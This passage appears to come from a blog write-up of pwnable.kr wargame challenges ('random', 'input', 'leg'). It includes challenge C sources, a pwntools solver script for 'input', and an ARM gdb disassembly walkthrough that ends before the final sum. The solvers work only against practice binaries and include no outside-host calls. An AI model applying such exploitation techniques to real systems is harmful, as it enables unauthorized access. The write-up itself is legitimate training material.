</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> random;
</span></span><span style=display:flex><span>        random <span style=color:#f92672>=</span> <span style=color:#a6e22e>rand</span>();        <span style=color:#75715e>// random value!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%u&#34;</span>, <span style=color:#ae81ff>0xdeadbeef</span> <span style=color:#f92672>^</span> random);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The printed value is the payload value we input to the challenge program.</p><h2 id=input---4-pt>input - 4 pt<a hidden class=anchor aria-hidden=true href=#input---4-pt>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>// input.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;arpa/inet.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> argv[], <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> envp[]){
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Welcome to pwnable.kr</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Let&#39;s see if you know how to give input to program</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Just give me correct inputs then you will get the flag :)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// argv
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>100</span>) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strcmp</span>(argv[<span style=color:#e6db74>&#39;A&#39;</span>],<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>)) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strcmp</span>(argv[<span style=color:#e6db74>&#39;B&#39;</span>],<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x20\x0a\x0d</span><span style=color:#e6db74>&#34;</span>)) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Stage 1 clear!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// stdio
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>4</span>];
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>memcmp</span>(buf, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x0a\x00\xff</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>4</span>)) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>2</span>, buf, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>memcmp</span>(buf, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x0a\x02\xff</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>4</span>)) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Stage 2 clear!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// env
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strcmp</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xca\xfe\xba\xbe</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>getenv</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xde\xad\xbe\xef</span><span style=color:#e6db74>&#34;</span>))) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Stage 3 clear!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// file
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        FILE<span style=color:#f92672>*</span> fp <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x0a</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>fp) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>fread</span>(buf, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>1</span>, fp)<span style=color:#f92672>!=</span><span style=color:#ae81ff>1</span> ) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>memcmp</span>(buf, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x00\x00\x00</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>4</span>) ) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fclose</span>(fp);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Stage 4 clear!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// network
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>int</span> sd, cd;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>struct</span> sockaddr_in saddr, caddr;
</span></span><span style=display:flex><span>        sd <span style=color:#f92672>=</span> <span style=color:#a6e22e>socket</span>(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(sd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;socket error, tell admin</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        saddr.sin_family <span style=color:#f92672>=</span> AF_INET;
</span></span><span style=display:flex><span>        saddr.sin_addr.s_addr <span style=color:#f92672>=</span> INADDR_ANY;        
</span></span><span style=display:flex><span>        saddr.sin_port <span style=color:#f92672>=</span> <span style=color:#a6e22e>htons</span>( <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#e6db74>&#39;C&#39;</span>]) );
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>bind</span>(sd, (<span style=color:#66d9ef>struct</span> sockaddr<span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>saddr, <span style=color:#66d9ef>sizeof</span>(saddr)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;bind error, use another port</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>listen</span>(sd, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> c <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> sockaddr_in);
</span></span><span style=display:flex><span>        cd <span style=color:#f92672>=</span> <span style=color:#a6e22e>accept</span>(sd, (<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>caddr, (<span style=color:#66d9ef>socklen_t</span><span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>c);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(cd <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;accept error, tell admin</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>recv</span>(cd, buf, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span> ) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>memcmp</span>(buf, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xde\xad\xbe\xef</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>4</span>)) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Stage 5 clear!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// here&#39;s your flag
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/cat flag&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>        
</span></span></code></pre></div><p>This challenge is about the interactiton with the program, including parameters passage, env arguments, file descriptors, and network connection. Due to permission issue, we need to create a softlink for the flag using <code>os.system('ln -s /home/input2/flag /tmp/flag')</code>. The final payload can be implemented by any language.</p><p>final payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;ln -s /home/input2/flag /tmp/flag&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># stage 1</span>
</span></span><span style=display:flex><span>argv <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;/home/input2/input&#39;</span>] <span style=color:#f92672>+</span> [<span style=color:#e6db74>&#39;A&#39;</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>99</span>
</span></span><span style=display:flex><span>argv[ord(<span style=color:#e6db74>&#39;A&#39;</span>)] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>argv[ord(<span style=color:#e6db74>&#39;B&#39;</span>)] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x20\x0a\x0d</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># stage 2</span>
</span></span><span style=display:flex><span>pr1, pw1 <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>pipe()
</span></span><span style=display:flex><span>pr2, pw2 <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>pipe()
</span></span><span style=display:flex><span>p1_content <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x0a\x00\xff</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>p2_content <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x0a\x02\xff</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>write(pw1, p1_content)
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>write(pw2, p2_content)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># stage 3</span>
</span></span><span style=display:flex><span>env <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xde\xad\xbe\xef</span><span style=color:#e6db74>&#39;</span>: <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xca\xfe\xba\xbe</span><span style=color:#e6db74>&#39;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># stage 4</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open (<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x0a</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>  f<span style=color:#f92672>.</span>write(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x00\x00\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># stage 5 - part1</span>
</span></span><span style=display:flex><span>argv[ord(<span style=color:#e6db74>&#39;C&#39;</span>)] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;23333&#39;</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> process(argv<span style=color:#f92672>=</span>argv, stdin<span style=color:#f92672>=</span>pr1, stderr<span style=color:#f92672>=</span>pr2, env<span style=color:#f92672>=</span>env, cwd<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;/tmp&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># stage 5 - part2</span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;localhost&#39;</span>, <span style=color:#ae81ff>23333</span>)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xde\xad\xbe\xef</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h2 id=leg---2-pt>leg - 2 pt<a hidden class=anchor aria-hidden=true href=#leg---2-pt>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>key1</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>asm</span>(<span style=color:#e6db74>&#34;mov r3, pc</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>key2</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>asm</span>(
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;push	{r6}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;add	r6, pc, $1</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;bx	r6</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;.code   16</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;mov	r3, pc</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;add	r3, $0x4</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;push	{r3}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;pop	{pc}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;.code	32</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;pop	{r6}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>	);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>key3</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>asm</span>(<span style=color:#e6db74>&#34;mov r3, lr</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> key<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Daddy has very strong arm! : &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>key);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>( (<span style=color:#a6e22e>key1</span>()<span style=color:#f92672>+</span><span style=color:#a6e22e>key2</span>()<span style=color:#f92672>+</span><span style=color:#a6e22e>key3</span>()) <span style=color:#f92672>==</span> key ){
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Congratz!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;flag&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>100</span>];
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>int</span> r <span style=color:#f92672>=</span> <span style=color:#a6e22e>read</span>(fd, buf, <span style=color:#ae81ff>100</span>);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>0</span>, buf, r);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;I have strong leg :P</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><pre tabindex=0><code>(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c &lt;+0&gt;:	push	{r4, r11, lr}
   0x00008d40 &lt;+4&gt;:	add	r11, sp, #8
   0x00008d44 &lt;+8&gt;:	sub	sp, sp, #12
   0x00008d48 &lt;+12&gt;:	mov	r3, #0
   0x00008d4c &lt;+16&gt;:	str	r3, [r11, #-16]
   0x00008d50 &lt;+20&gt;:	ldr	r0, [pc, #104]	; 0x8dc0 &lt;main+132&gt;
   0x00008d54 &lt;+24&gt;:	bl	0xfb6c &lt;printf&gt;
   0x00008d58 &lt;+28&gt;:	sub	r3, r11, #16
   0x00008d5c &lt;+32&gt;:	ldr	r0, [pc, #96]	; 0x8dc4 &lt;main+136&gt;
   0x00008d60 &lt;+36&gt;:	mov	r1, r3
   0x00008d64 &lt;+40&gt;:	bl	0xfbd8 &lt;__isoc99_scanf&gt;
   0x00008d68 &lt;+44&gt;:	bl	0x8cd4 &lt;key1&gt;
   0x00008d6c &lt;+48&gt;:	mov	r4, r0
   0x00008d70 &lt;+52&gt;:	bl	0x8cf0 &lt;key2&gt;
   0x00008d74 &lt;+56&gt;:	mov	r3, r0
   0x00008d78 &lt;+60&gt;:	add	r4, r4, r3
   0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;
   0x00008d80 &lt;+68&gt;:	mov	r3, r0
   0x00008d84 &lt;+72&gt;:	add	r2, r4, r3
   0x00008d88 &lt;+76&gt;:	ldr	r3, [r11, #-16]
   0x00008d8c &lt;+80&gt;:	cmp	r2, r3
   0x00008d90 &lt;+84&gt;:	bne	0x8da8 &lt;main+108&gt;
   0x00008d94 &lt;+88&gt;:	ldr	r0, [pc, #44]	; 0x8dc8 &lt;main+140&gt;
   0x00008d98 &lt;+92&gt;:	bl	0x1050c &lt;puts&gt;
   0x00008d9c &lt;+96&gt;:	ldr	r0, [pc, #40]	; 0x8dcc &lt;main+144&gt;
   0x00008da0 &lt;+100&gt;:	bl	0xf89c &lt;system&gt;
   0x00008da4 &lt;+104&gt;:	b	0x8db0 &lt;main+116&gt;
   0x00008da8 &lt;+108&gt;:	ldr	r0, [pc, #32]	; 0x8dd0 &lt;main+148&gt;
   0x00008dac &lt;+112&gt;:	bl	0x1050c &lt;puts&gt;
   0x00008db0 &lt;+116&gt;:	mov	r3, #0
   0x00008db4 &lt;+120&gt;:	mov	r0, r3
   0x00008db8 &lt;+124&gt;:	sub	sp, r11, #8
   0x00008dbc &lt;+128&gt;:	pop	{r4, r11, pc}
   0x00008dc0 &lt;+132&gt;:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 &lt;+136&gt;:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 &lt;+140&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4b0
   0x00008dcc &lt;+144&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4bc
   0x00008dd0 &lt;+148&gt;:	andeq	r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0
   0x00008cdc &lt;+8&gt;:	mov	r3, pc
   0x00008ce0 &lt;+12&gt;:	mov	r0, r3
   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0
   0x00008ce8 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec &lt;+24&gt;:	bx	lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0
   0x00008cf8 &lt;+8&gt;:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1
   0x00008d00 &lt;+16&gt;:	bx	r6
   0x00008d04 &lt;+20&gt;:	mov	r3, pc
   0x00008d06 &lt;+22&gt;:	adds	r3, #4
   0x00008d08 &lt;+24&gt;:	push	{r3}
   0x00008d0a &lt;+26&gt;:	pop	{pc}
   0x00008d0c &lt;+28&gt;:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 &lt;+32&gt;:	mov	r0, r3
   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0
   0x00008d18 &lt;+40&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c &lt;+44&gt;:	bx	lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0
   0x00008d28 &lt;+8&gt;:	mov	r3, lr
   0x00008d2c &lt;+12&gt;:	mov	r0, r3
   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0
   0x00008d34 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 &lt;+24&gt;:	bx	lr
End of assembler dump.
(gdb) 
</code></pre><p>This is the first time I deal with ARM, it looks similar to x86 architecture but has some unique feature.</p><ol><li><code>lr</code> register stores return address, the same as <code>ebp+4</code> or <code>rbp+8</code> in x86 architecture.</li><li>To improve CPU performance, ARM uses 3-stage pipeline (note: currently we have 5-stage pipeline but the idea is similar). The whole lifecycle of one instruction includes 1.fetch 2.decode 3.execute. While current instruction is being <strong>executed</strong>, next instruction must be in <strong>decode</strong> phaze and the instruction after is being <strong>fetched</strong>. <code>pc</code> register points to the instruction that is being <strong>fetched</strong>, which means when we look at a specific instruction, the referred <code>pc</code> register holds the address of the instruction after next one, it should be either <strong>+4</strong> in <code>thumb</code> mode or <strong>+8</strong> in <code>ARM</code> mode.</li><li>The length of a single instruction in <code>x86</code> is not fixed whereas in <code>ARM</code> the length is 2 bytes in <code>thumb</code> mode and 4 bytes in <code>ARM</code> mode.</li></ol><p>Back to this challenge, we need to calculate the sum of each function to get the flag.</p><p>key1</p><pre tabindex=0><code>   0x00008cdc &lt;+8&gt;:	mov	r3, pc     &lt;- r3 = 0x8ce4
   0x00008ce0 &lt;+12&gt;:	mov	r0, r3
   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0

   key1 = 0x8ce4
</code></pre><p>key2</p><pre tabindex=0><code>   0x00008d04 &lt;+20&gt;:	mov	r3, pc    &lt;- r3 = 0x8d08
   0x00008d06 &lt;+22&gt;:	adds	r3, #4    &lt;- r3 = r3 + 4 = 0x8d0c
   0x00008d08 &lt;+24&gt;:	push	{r3}

   key2 = 0x8d0c
</code></pre><p>key3</p><pre tabindex=0><code>&lt;main&gt;
   ...
   0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;
   0x00008d80 &lt;+68&gt;:	mov	r3, r0
   ...
&lt;key3&gt;
   ...
   0x00008d28 &lt;+8&gt;:	mov	r3, lr    &lt;- r3 = 0x8d80
   0x00008d2c &lt;+12&gt;:	mov	r0, r3
   ...

   key3 = 0x8d80
